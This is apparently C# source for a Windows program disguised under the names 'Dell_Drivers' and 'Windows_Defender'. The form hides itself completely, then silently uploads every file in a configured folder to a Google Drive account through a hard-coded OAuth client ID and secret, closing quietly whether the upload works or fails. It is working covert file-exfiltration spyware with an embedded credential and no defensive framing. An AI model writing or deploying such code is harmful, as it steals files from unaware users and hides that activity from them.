using Google.Apis.Auth.OAuth2;
using Google.Apis.Services;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Dell_Drivers
{
    public partial class Windows_Defender : Form
    {
        public Windows_Defender()
        {
            InitializeComponent();
            this.Opacity = 0;
            this.WindowState = FormWindowState.Minimized;
            this.ShowInTaskbar = false;
        }

        private Google.Apis.Drive.v3.DriveService service = new Google.Apis.Drive.v3.DriveService();


        private void createservice()
        {
            string clientid = "33112220271-90jmr0k7ajfptp3fvte99h27b9srcg5o.apps.googleusercontent.com";
            string clientsecret = "ofn4YpoJsGJ2mfOjFlliKvXx";
            var uc = GoogleWebAuthorizationBroker.AuthorizeAsync(new ClientSecrets() { ClientId = clientid, ClientSecret = clientsecret }, new[] { Google.Apis.Drive.v2.DriveService.Scope.Drive }, "user", CancellationToken.None).Result;
            service = new Google.Apis.Drive.v3.DriveService(new BaseClientService.Initializer() { HttpClientInitializer = uc, ApplicationName = "Google Drive VB Dot Net" });
        }

        private void Windows_Defender_Load(object sender, EventArgs e)
        {
            string folderId = global.folderID_G;
            


            try
            {
                //string[] myfiles = Directory.GetFiles(@"c:\Windows\Logs\Telephony\Tempo\");
                string[] myfiles = Directory.GetFiles(global.fileUploadPath);


                if (service.ApplicationName != "Google Drive VB Dot Net")
                    createservice();

                var fileMetadata = new Google.Apis.Drive.v3.Data.File();
                fileMetadata.Parents = new List<string>
                {
                    folderId
                };

                for (int i = 0; i < myfiles.Length; i++)
                {

                    string[] namebreaker = myfiles[i].Split('\\');
                    string foundName = namebreaker[(namebreaker.Length - 1)];
                    fileMetadata.Name = foundName;


                    Google.Apis.Drive.v3.FilesResource.CreateMediaUpload request;
                    using (var stream = new FileStream(myfiles[i], FileMode.Open))
                    {
                        request = service.Files.Create(fileMetadata, stream, fileMetadata.MimeType);
                        request.Upload();
                    }
                    var file = request.ResponseBody;

                    //return file.Id;
                }

                this.Close();
                GC.Collect();

            }

            catch
            {
                this.Close();
                GC.Collect();
            }
        }
    }
}
